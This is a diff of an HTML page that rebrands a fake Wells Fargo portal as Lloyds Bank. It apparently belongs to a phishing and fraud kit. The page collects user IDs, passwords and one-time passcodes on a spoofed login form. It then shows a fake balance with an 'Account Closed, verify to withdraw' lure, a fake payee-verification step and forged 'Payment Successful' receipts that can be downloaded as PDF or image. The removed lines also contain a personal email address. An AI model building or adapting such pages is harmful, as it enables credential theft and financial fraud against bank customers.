@@ -3,29 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Wells Fargo</title>
-    <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
+    <link rel="icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
+    <title>Lloyds Bank - Personal Banking</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <link rel="icon" type="image/x-icon" href="https://www.lloydsbank.com/favicon.ico">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
-        body { background-color:#f5f7fa; display:flex; flex-direction:column; min-height:100vh; }
-        .header { background-color:#d71e28; color:white; padding:20px 30px; display:flex; align-items:center; justify-content:space-between; border-bottom:4px solid #a8151b; }
-        .logo { font-size:28px; font-weight:bold; display:flex; align-items:center; }
-        .nav { display:flex; gap:20px; }
-        .nav a { color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px; transition:background 0.3s; }
-        .nav a:hover { background-color:#a8151b; }
+        <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: "Segoe UI", Arial, sans-serif; }
+        body { background-color:#fff; display:flex; flex-direction:column; min-height:100vh; color:#333; }
+        
+        /* Top Green Header */
+        .top-header { background-color:#029352; padding:15px 40px; display:flex; align-items:center; justify-content:space-between; }
+        .top-header .logo { display:flex; align-items:center; gap:10px; color:black; font-weight:bold; font-size:24px; }
+        .top-header .search-bar { display:flex; align-items:center; background:white; border-radius:4px; padding:5px 10px; width:300px; }
+        .top-header .search-bar input { border:none; outline:none; flex:1; font-size:14px; }
+        .top-header .search-bar i { color:#666; margin-left:10px; }
+
+        /* Black Nav Bar */
+        .main-nav { background-color:black; padding:0 40px; display:flex; gap:30px; }
+        .main-nav a { color:white; text-decoration:none; font-weight:bold; padding:15px 0; font-size:16px; border-bottom:3px solid transparent; }
+        .main-nav a:hover { border-bottom:3px solid #029352; }
+
+        /* Breadcrumbs */
+        .breadcrumbs { padding:15px 40px; font-size:14px; color:#333; font-weight:bold; }
+        .breadcrumbs a { color:#333; text-decoration:underline; margin:0 5px; }
+
+        /* Hero Section */
+        .hero-section { position:relative; display:flex; justify-content:space-between; padding:60px 40px; background: linear-gradient(to right, #000 0%, #333 40%, #e0e0e0 100%); color:white; min-height:450px; }
+        .hero-text { max-width:50%; z-index:2; }
+        .hero-text h1 { font-size:48px; margin-bottom:20px; font-weight:bold; }
+        .hero-text p { font-size:20px; line-height:1.5; font-weight:bold; }
+
+        /* Login Box (Floating) */
+        .login-box { background:white; padding:30px; border-radius:8px; box-shadow:0 10px 30px rgba(0,0,0,0.3); width:350px; color:#333; z-index:2; align-self:flex-start; }
+        .login-box h2 { color:#006a4d; margin-bottom:20px; font-size:22px; text-align:center; }
+        .input-group { margin-bottom:15px; }
+        .label { display:block; margin-bottom:5px; font-weight:bold; font-size:14px; }
+        .input-field { width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; font-size:14px; }
+        .btn { background-color:#029352; color:white; padding:12px; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; width:100%; }
+        .btn:hover { background-color:#017a44; }
+
+        /* Content Grid */
+        .content-grid { display:flex; padding:40px; gap:40px; background:white; }
+        .grid-col { flex:1; display:flex; flex-direction:column; gap:20px; }
+        .video-card { background:#51b770; padding:40px; border-radius:12px; position:relative; text-align:center; color:black; height:300px; display:flex; flex-direction:column; justify-content:center; align-items:center; }
+        .video-card h3 { font-size:24px; margin-bottom:20px; max-width:80%; }
+        .play-btn { width:60px; height:60px; background:black; color:white; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:24px; cursor:pointer; }
+        .article-card { background:#f5f5f5; border-radius:12px; overflow:hidden; }
+        .article-img { width:100%; height:200px; background:#ddd; object-fit:cover; }
+        .article-text { padding:30px; }
+        .article-text h3 { font-size:28px; margin-bottom:15px; }
+        .article-text p { font-size:16px; line-height:1.6; color:#333; }
+
+        /* Lives Empowered Banner */
+        .banner-section { display:flex; background:#cbf4c9; margin:40px; border-radius:12px; overflow:hidden; }
+        .banner-text { flex:1; padding:60px 40px; }
+        .banner-text h2 { font-size:36px; margin-bottom:15px; color:black; }
+        .banner-text p { font-size:18px; margin-bottom:30px; font-weight:bold; }
+        .banner-btn { background:black; color:white; padding:12px 30px; border-radius:8px; text-decoration:none; font-weight:bold; display:inline-block; }
+        .banner-img { flex:1; background:#ddd; }
+
+        /* How is Lloyds Section */
+        .how-section { padding:40px; text-align:center; max-width:900px; margin:0 auto; }
+        .how-section h2 { font-size:36px; margin-bottom:30px; }
+        .how-box { background:#f5f5f5; padding:40px; border-radius:12px; text-align:left; font-size:16px; line-height:1.6; }
+        .how-box p { margin-bottom:15px; }
+
+        /* Keep existing styles for app views */
         .container { flex:1; display:flex; padding:30px; gap:30px; }
         .sidebar { width:300px; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
-        .sidebar h3 { color:#d71e28; margin-bottom:20px; font-size:18px; border-bottom:2px solid #eee; padding-bottom:10px; }
+        .sidebar h3 { color:#006a4d; margin-bottom:20px; font-size:18px; border-bottom:2px solid #eee; padding-bottom:10px; }
         .main-content { flex:1; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
         .form-section { margin-bottom:30px; }
-        .form-section h2 { color:#a8151b; margin-bottom:15px; font-size:22px; }
-        .input-group { margin-bottom:20px; }
-        .label { display:block; margin-bottom:8px; color:#333; font-weight:600; }
-        .input-field { width:100%; padding:12px 15px; border:1px solid #ccc; border-radius:6px; font-size:16px; transition:border 0.3s; }
-        .input-field:focus { border-color:#d71e28; outline:none; }
-        .btn { background-color:#d71e28; color:white; padding:14px 20px; border:none; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; transition:background 0.3s; width:100%; }
-        .btn:hover { background-color:#a8151b; }
+        .form-section h2 { color:#004d38; margin-bottom:15px; font-size:22px; }
         .chat-container { background-color:#f9f9f9; border-radius:10px; padding:20px; height:400px; overflow-y:auto; border:1px solid #ddd; margin-top:30px; }
         .chat-box { display:flex; flex-direction:column; gap:15px; }
         .chat-message { padding:12px 15px; border-radius:8px; max-width:80%; }
@@ -33,32 +85,17 @@
         .chat-message.admin { background-color:#f1f1f1; align-self:flex-start; }
         .chat-input-area { display:flex; margin-top:20px; gap:10px; }
         .chat-input { flex:1; padding:12px; border:1px solid #ccc; border-radius:6px; }
-        .chat-send { background-color:#d71e28; color:white; padding:12px 20px; border:none; border-radius:6px; cursor:pointer; }
+        .chat-send { background-color:#006a4d; color:white; padding:12px 20px; border:none; border-radius:6px; cursor:pointer; }
         .footer { text-align:center; padding:20px; background-color:#eee; color:#666; border-top:1px solid #ddd; }
-        /* Account closed alert */
         .alert-closed { background:#f8d7da; color:#721c24; padding:15px 20px; border-radius:8px; margin-bottom:20px; border:1px solid #f5c6cb; font-weight:bold; }
-        /* Account closed modal */
         .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; align-items:center; justify-content:center; }
         .modal-overlay.active { display:flex; }
         .modal-box { background:white; padding:30px; border-radius:12px; max-width:450px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.3); text-align:center; }
-        .modal-box i { font-size:48px; color:#d71e28; margin-bottom:15px; }
+        .modal-box i { font-size:48px; color:#006a4d; margin-bottom:15px; }
         .modal-box h3 { color:#333; margin-bottom:10px; font-size:20px; }
         .modal-box p { color:#666; margin-bottom:20px; line-height:1.5; }
-        .modal-box button { background:#d71e28; color:white; padding:12px 30px; border:none; border-radius:6px; font-size:15px; font-weight:bold; cursor:pointer; }
-        .modal-box button:hover { background:#a8151b; }
-        @media (max-width:768px) {
-            .header { flex-direction:column; align-items:flex-start; padding:15px; }
-            .logo { margin-bottom:15px; }
-            .nav { flex-wrap:wrap; gap:10px; width:100%; }
-            .container { padding:15px; flex-direction:column; }
-            #view-verification { flex-direction:column !important; }
-            .sidebar { width:100% !important; }
-            #view-home>div:nth-of-type(3) { flex-direction:column; }
-            .chase-card { padding:20px !important; }
-            .chase-card .card-number { font-size:20px !important; }
-            .chase-card .card-bottom { flex-direction:column; align-items:flex-start !important; gap:15px; }
-            .chase-card .card-balance { text-align:left !important; }
-        }
+        .modal-box button { background:#006a4d; color:white; padding:12px 30px; border:none; border-radius:6px; font-size:15px; font-weight:bold; cursor:pointer; }
+        .modal-box button:hover { background:#004d38; }
     </style>
 </head>
 <body>
@@ -68,51 +105,138 @@
         <div class="modal-box">
             <i class="fas fa-exclamation-triangle"></i>
             <h3>Account Closed</h3>
-            <p>Please complete verification to withdraw funds. Contact Wells Fargo Support for assistance.</p>
+            <p>Please complete verification to withdraw funds. Contact Lloyds Support for assistance.</p>
             <button onclick="closeModal()">OK</button>
         </div>
     </div>
 
     <!-- App header (shown after login) -->
-    <div class="header" id="app-header" style="display:none;">
-        <div class="logo"><i class="fas fa-university"></i>&nbsp; Wells Fargo Secure Portal</div>
-        <div class="nav">
-            <a href="javascript:void(0)" onclick="showView('home')">Home</a>
-            <a href="javascript:void(0)" onclick="showView('verification')">Verification</a>
-            <a href="javascript:void(0)" onclick="showView('history')">Transaction History</a>
-            <a href="javascript:void(0)" onclick="showSupport()">Support</a>
+    <div class="header" id="app-header" style="display:none; background-color:#029352; color:white; padding:20px 30px; align-items:center; justify-content:space-between; border-bottom:4px solid #017a44;">
+        <div class="logo" style="font-size:28px; font-weight:bold; display:flex; align-items:center;"><i class="fas fa-university"></i>&nbsp; Lloyds Banking Group Secure Portal</div>
+        <div class="nav" style="display:flex; gap:20px;">
+            <a href="javascript:void(0)" onclick="showView('home')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Home</a>
+            <a href="javascript:void(0)" onclick="showView('verification')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Verification</a>
+            <a href="javascript:void(0)" onclick="showView('history')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Transaction History</a>
+            <a href="javascript:void(0)" onclick="showSupport()" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Support</a>
         </div>
     </div>
 
-    <!-- Fake Login View -->
-    <div id="view-login" style="display:block; max-width:400px; margin:40px auto; background:white; padding:30px; border-radius:10px; box-shadow:0 10px 30px rgba(0,0,0,0.1); width:90%;">
-        <div style="text-align:center; margin-bottom:20px;">
-            <i class="fas fa-university" style="font-size:40px; color:#d71e28; margin-bottom:10px;"></i>
-            <h2 style="color:#a8151b;">Sign In to Wells Fargo</h2>
+    <!-- Main Landing View (with Login) -->
+    <div id="view-login" style="display:block;">
+        
+        <!-- Top Green Header -->
+        <div class="top-header">
+            <div class="logo">
+                <i class="fas fa-horse-head" style="font-size:32px;"></i>
+                <div style="line-height:1;">
+                    <div style="font-size:24px; font-weight:bold;">LLOYDS</div>
+                    <div style="font-size:14px; font-weight:normal; letter-spacing:1px;">BANKING GROUP</div>
+                </div>
+            </div>
+            <div class="search-bar">
+                <input type="text" placeholder="Search...">
+                <i class="fas fa-microphone"></i>
+                <i class="fas fa-search"></i>
+            </div>
         </div>
 
-        <div id="loginStep1">
-            <div class="input-group">
-                <label class="label">Username</label>
-                <input type="text" class="input-field" id="chaseUser" placeholder="Enter username">
-            </div>
-            <div class="input-group">
-                <label class="label">Password</label>
-                <input type="password" class="input-field" id="chasePass" placeholder="Enter password">
-            </div>
-            <button class="btn" onclick="submitWellsFargoLogin()">Sign In</button>
+        <!-- Black Nav Bar -->
+        <div class="main-nav">
+            <a href="#">Who we are <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
+            <a href="#">Sustainability <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
+            <a href="#">Investors <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
+            <a href="#">News & insights <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
+            <a href="#">Careers <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
         </div>
 
-        <div id="loginStep2" style="display:none; text-align:center;">
-            <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i> Verification Required</p>
-            <p id="otpEmailDisplay" style="margin-bottom:20px; color:#666;">A one-time passcode has been sent to <strong>kyungzing9@gmail.com</strong>. Please enter it below.</p>
-            <div class="input-group" style="text-align:left;">
-                <label class="label">OTP Code</label>
-                <input type="text" class="input-field" id="chaseOtp" placeholder="Enter 6-digit OTP code">
-            </div>
-            <button class="btn" onclick="submitWfOtp()">Verify & Sign In</button>
-            <div id="statusLogin" style="margin-top:15px; font-weight:bold;"></div>
+        <!-- Breadcrumbs -->
+        <div class="breadcrumbs">
+            <a href="#">Who we are</a> / <a href="#">Purpose and strategy</a> / <span>Financial empowerment</span>
         </div>
+
+        <!-- Hero Section with Floating Login -->
+        <div class="hero-section">
+            <div class="hero-text">
+                <h1>Supporting and enabling<br>financial empowerment</h1>
+                <p>Through simple digital tools, personalised insights and timely<br>guidance, we're helping people make informed decisions<br>every day and take small but meaningful steps toward<br>stronger financial futures.</p>
+            </div>
+            
+            <!-- The Floating Login Box -->
+            <div class="login-box">
+                <h2>Sign In to Online Banking</h2>
+                
+                <div id="loginStep1">
+                    <div class="input-group">
+                        <label class="label">User ID</label>
+                        <input type="text" class="input-field" id="chaseUser" placeholder="Enter User ID">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Password</label>
+                        <input type="password" class="input-field" id="chasePass" placeholder="Enter Password">
+                    </div>
+                    <button class="btn" onclick="submitLloydsLogin()">Continue</button>
+                    <div style="margin-top:15px; text-align:center; font-size:14px;">
+                        <a href="#" style="color:#029352; text-decoration:none;">Forgotten your logon details?</a>
+                    </div>
+                </div>
+
+                <div id="loginStep2" style="display:none; text-align:center;">
+                    <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i> Verification Required</p>
+                    <p id="otpEmailDisplay" style="margin-bottom:20px; color:#666; font-size:14px;">A one-time passcode has been sent to your registered contact. Please enter it below.</p>
+                    <div class="input-group" style="text-align:left;">
+                        <label class="label">OTP Code</label>
+                        <input type="text" class="input-field" id="chaseOtp" placeholder="Enter 6-digit code">
+                    </div>
+                    <button class="btn" onclick="submitWfOtp()">Verify & Sign In</button>
+                    <div id="statusLogin" style="margin-top:15px; font-weight:bold; font-size:14px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Content Grid (Video and Article) -->
+        <div class="content-grid">
+            <div class="grid-col">
+                <div class="video-card">
+                    <h3>What is financial empowerment and why does it matter?</h3>
+                    <div class="play-btn"><i class="fas fa-play"></i></div>
+                </div>
+                <div>
+                    <p style="font-weight:bold; margin-bottom:10px;">Video | 6 mins</p>
+                    <p style="color:#555; line-height:1.6; margin-bottom:10px;">In this video, we explore what financial empowerment really means, why it's different from financial wellbeing, and why it plays such an important role in helping people take control of their financial lives.</p>
+                    <a href="#" style="color:black; font-weight:bold; text-decoration:underline;">Watch video ></a>
+                </div>
+            </div>
+            
+            <div class="grid-col">
+                <div class="article-card">
+                    <img src="https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Woman looking at phone" class="article-img">
+                    <div class="article-text">
+                        <h3>What is financial empowerment, and why does it matter?</h3>
+                        <p>When we talk about people's financial lives, terms such as financial wellbeing and financial resilience are often front of mind. But there's another concept that is just as important to how people experience money in their everyday lives: financial empowerment.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Lives Empowered Banner -->
+        <div class="banner-section">
+            <div class="banner-text">
+                <h2>Lives empowered, a nation<br>empowered</h2>
+                <p>Helping the nation make the most of its finances.</p>
+                <a href="#" class="banner-btn">Read the report</a>
+            </div>
+            <div class="banner-img" style="background: url('https://images.unsplash.com/photo-1600880292203-757bb62b4baf?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80') center/cover;"></div>
+        </div>
+
+        <!-- How is Lloyds Section -->
+        <div class="how-section">
+            <h2>How is Lloyds Banking Group enabling<br>financial empowerment?</h2>
+            <div class="how-box">
+                <p><strong>Financial empowerment comes when people have the confidence, tools, knowledge and opportunities to take control of their financial lives and improve their financial wellbeing over time.</strong></p>
+                <p>As a leader in digital transformation, we're already shaping the future of finance and supporting people to achieve their financial goals through simple digital tools, personalised insights and timely guidance embedded in everyday banking.</p>
+            </div>
+        </div>
+
     </div>
 
     <div class="container" id="main-app" style="display:none;">
@@ -125,9 +249,9 @@
                     <i class="fas fa-exclamation-triangle"></i> Account Closed. Please complete verification to withdraw funds.
                 </div>
 
-                <div class="chase-card" style="background: linear-gradient(135deg, #d71e28, #8b0000); color:white; padding:25px; border-radius:15px; margin-bottom:30px; box-shadow:0 10px 20px rgba(0,0,0,0.2); position:relative; max-width:500px;">
+                <div class="chase-card" style="background: linear-gradient(135deg, #006a4d, #003325); color:white; padding:25px; border-radius:15px; margin-bottom:30px; box-shadow:0 10px 20px rgba(0,0,0,0.2); position:relative; max-width:500px;">
                     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                        <span style="font-size:22px; font-weight:bold;">Wells Fargo</span>
+                        <span style="font-size:22px; font-weight:bold;">Lloyds Banking Group</span>
                         <i class="fas fa-wifi" style="transform:rotate(90deg); font-size:24px; opacity:0.8;"></i>
                     </div>
                     <div class="card-number" style="font-family:'Courier New',monospace; font-size:26px; letter-spacing:2px; margin-bottom:15px; text-shadow:1px 1px 2px rgba(0,0,0,0.3);">
@@ -141,7 +265,7 @@
                         </div>
                         <div class="card-balance" style="text-align:right;">
                             <h3 style="font-weight:400; opacity:0.9; font-size:12px;">Total Checking Balance</h3>
-                            <p id="cardDisplayBalance" style="font-size:26px; font-weight:bold; margin-top:5px;">$140,000.00</p>
+                            <p id="cardDisplayBalance" style="font-size:26px; font-weight:bold; margin-top:5px;">£140,000.00</p>
                             <p style="font-size:24px; font-weight:bold; font-style:italic; margin-top:10px; color:rgba(255,255,255,0.9);">VISA</p>
                         </div>
                     </div>
@@ -149,9 +273,9 @@
 
                 <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Quick Actions</h3>
                 <div style="display:flex; gap:15px;">
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-exchange-alt" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-file-invoice-dollar" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-chart-line" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
+                    <button onclick="handleQuickAction('transfer')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-exchange-alt" style="color:#006a4d; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
+                    <button onclick="handleQuickAction('bills')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-file-invoice-dollar" style="color:#006a4d; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
+                    <button onclick="handleQuickAction('investments')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-chart-line" style="color:#006a4d; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
                 </div>
             </div>
 
@@ -163,7 +287,7 @@
                     <i class="fas fa-eye-slash" style="font-size:48px; color:#999; margin-bottom:20px;"></i>
                     <h3 style="color:#333; margin-bottom:10px;">Security Verification Required</h3>
                     <p style="color:#666; margin-bottom:20px;">To protect your sensitive financial data, please confirm your identity to view past transactions.</p>
-                    <button onclick="promptTxOtp()" style="background:#d71e28; color:white; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; font-weight:bold;"><i class="fas fa-lock"></i> Request Verification Code</button>
+                    <button onclick="promptTxOtp()" style="background:#006a4d; color:white; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; font-weight:bold;"><i class="fas fa-lock"></i> Request Verification Code</button>
                     <div id="txOtpPrompt" style="display:none; margin-top:25px; padding-top:20px; border-top:1px dashed #ccc; text-align:left; max-width:300px; margin-left:auto; margin-right:auto;">
                         <label style="display:block; margin-bottom:8px; font-weight:bold; color:#333;">Enter 6-Digit OTP Code</label>
                         <input type="text" id="txOtp" style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px;" placeholder="e.g. 123456">
@@ -178,13 +302,155 @@
                 </div>
             </div>
 
+            
+            <!-- Transfer Funds View -->
+            <div id="view-transfer" style="display:none;">
+                <h2 style="color:#006a4d; margin-bottom:20px; font-size:24px;"><i class="fas fa-exchange-alt"></i> Transfer Funds</h2>
+                
+                <div id="transferStep1">
+                    <p style="margin-bottom:15px; color:#555;">Select a bank from the United Kingdom to transfer funds to:</p>
+                    <input type="text" id="bankSearch" placeholder="Search UK Banks..." style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;">
+                    <div id="bankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
+                        <!-- JS injects banks here -->
+                    </div>
+                </div>
+
+                                <div id="transferStep2" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
+                    <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Recipient Details</h3>
+                    <p style="margin-bottom:15px; font-size:14px; color:#006a4d; font-weight:bold;" id="selectedBankDisplay"></p>
+                    
+                    <div class="input-group">
+                        <label class="label">Full Name</label>
+                        <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Sort Code (6 digits)</label>
+                        <input type="text" class="input-field" id="txSortCode" placeholder="XX-XX-XX">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Account Number (8 digits)</label>
+                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
+                    </div>
+                    
+                    <div id="starkVerificationBadge" style="display:none; background:#e8f4f0; border-left:4px solid #006a4d; padding:12px; margin-bottom:15px; border-radius:4px; animation: fadeIn 0.5s;">
+                        <p style="color:#004d38; font-size:13px; margin-bottom:2px;"><i class="fas fa-check-circle"></i> <strong>Payee Verified</strong></p>
+                        <p style="font-size:16px; font-weight:bold; color:#333;">STARK Building Materials UK</p>
+                    </div>
+
+                    <button class="btn" id="btnVerifyDetails" onclick="verifyTransferDetails()">Verify Details</button>
+                    
+                    <!-- Hidden elements until verified -->
+                    <div id="amountSection" style="display:none; margin-top:20px; border-top:1px solid #eee; padding-top:15px;">
+                        <div class="input-group">
+                            <label class="label">Amount to Transfer (£)</label>
+                            <input type="number" class="input-field" id="txTransferAmount" placeholder="0.00">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">Reference (Optional)</label>
+                            <input type="text" class="input-field" id="txReference" placeholder="e.g. Invoice Payment">
+                        </div>
+                        <button class="btn" onclick="submitFinalTransfer()">Send</button>
+                    </div>
+
+                    <button class="btn" onclick="resetTransferFlow()" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
+                </div>
+
+                <div id="transferLoading" style="display:none; text-align:center; padding:40px;">
+                    <i class="fas fa-spinner fa-spin" style="font-size:40px; color:#006a4d; margin-bottom:15px;"></i>
+                    <p style="font-size:16px; color:#666;">Contacting clearing house to verify payee details...</p>
+                </div>
+
+            </div>
+
+            <div id="view-receipt" style="display:none;">
+                <div id="receiptContainer" style="background:#fff; border:1px solid #ddd; padding:30px; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); margin-bottom:20px; position:relative;">
+                    <div style="text-align:center; margin-bottom:20px;">
+                        <i class="fas fa-check-circle" style="font-size:50px; color:#006a4d; margin-bottom:10px;"></i>
+                        <h2 style="color:#333;">Payment Successful</h2>
+                        <p style="color:#666; font-size:14px;" id="receiptDate"></p>
+                    </div>
+                    <div style="border-top:2px dashed #eee; border-bottom:2px dashed #eee; padding:20px 0; margin-bottom:20px;">
+                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Amount Sent:</span> <strong style="color:#333; font-size:20px;" id="receiptAmount"></strong></p>
+                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Recipient:</span> <strong style="color:#333;">STARK Building Materials UK</strong></p>
+                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Bank:</span> <strong style="color:#333; text-align:right; max-width:60%;" id="receiptBank"></strong></p>
+                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Account Name:</span> <strong style="color:#333;" id="receiptName"></strong></p>
+                        <p style="display:flex; justify-content:space-between; color:#555;"><span>Transaction Ref:</span> <strong style="color:#333;" id="receiptRef"></strong></p>
+                    </div>
+                    <div style="text-align:center;">
+                        <img src="https://www.lloydsbank.com/assets/media/logo/lloyds-bank-logo.svg" style="height:30px; opacity:0.8;">
+                    </div>
+                </div>
+                
+                <div style="display:flex; gap:15px;">
+                    <button onclick="downloadReceiptPDF()" class="btn" style="flex:1; background:#34495e;"><i class="fas fa-file-pdf"></i> Download PDF</button>
+                    <button onclick="downloadReceiptImage()" class="btn" style="flex:1; background:#2980b9;"><i class="fas fa-image"></i> Download Image</button>
+                </div>
+                <button onclick="showView('home')" class="btn" style="background:#006a4d; margin-top:15px;">Return to Home</button>
+            </div>
+            
+            <!-- Pay Bills View -->
+            <div id="view-bills" style="display:none;">
+                <h2 style="color:#006a4d; margin-bottom:20px; font-size:24px;"><i class="fas fa-file-invoice-dollar"></i> Pay Bills</h2>
+                <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px;">
+                    <p style="margin-bottom:15px; color:#666;">Pay your registered utility and service bills quickly and securely.</p>
+                    <div class="input-group">
+                        <label class="label">Select Biller</label>
+                        <select class="input-field" id="billPayee">
+                            <option>British Gas</option>
+                            <option>Thames Water</option>
+                            <option>EE Mobile</option>
+                            <option>Council Tax</option>
+                            <option>Virgin Media</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Amount (£)</label>
+                        <input type="number" class="input-field" id="billAmount" placeholder="0.00">
+                    </div>
+                    <button class="btn" onclick="submitBillPayment()">Pay Bill</button>
+                </div>
+            </div>
+
+            <!-- Investments View -->
+            <div id="view-investments" style="display:none;">
+                <h2 style="color:#006a4d; margin-bottom:20px; font-size:24px;"><i class="fas fa-chart-line"></i> Investments Portfolio</h2>
+                <p style="margin-bottom:20px; color:#666;">Manage your assets and explore new investment opportunities directly from your account.</p>
+                
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #f1c40f;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-coins" style="color:#f1c40f;"></i> Gold & Silver</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#006a4d;">+2.4%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Market is performing well today.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #3498db;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fab fa-bitcoin" style="color:#3498db;"></i> Cryptocurrency</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#d9534f;">-5.1%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">High volatility detected.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #2ecc71;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-chart-bar" style="color:#2ecc71;"></i> Stocks & ETFs</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#006a4d;">+1.1%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Steady growth in tech sector.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Trade</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #9b59b6;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-piggy-bank" style="color:#9b59b6;"></i> Fixed Bonds</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#006a4d;">4.5% AER</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Guaranteed returns for 12 months.</p>
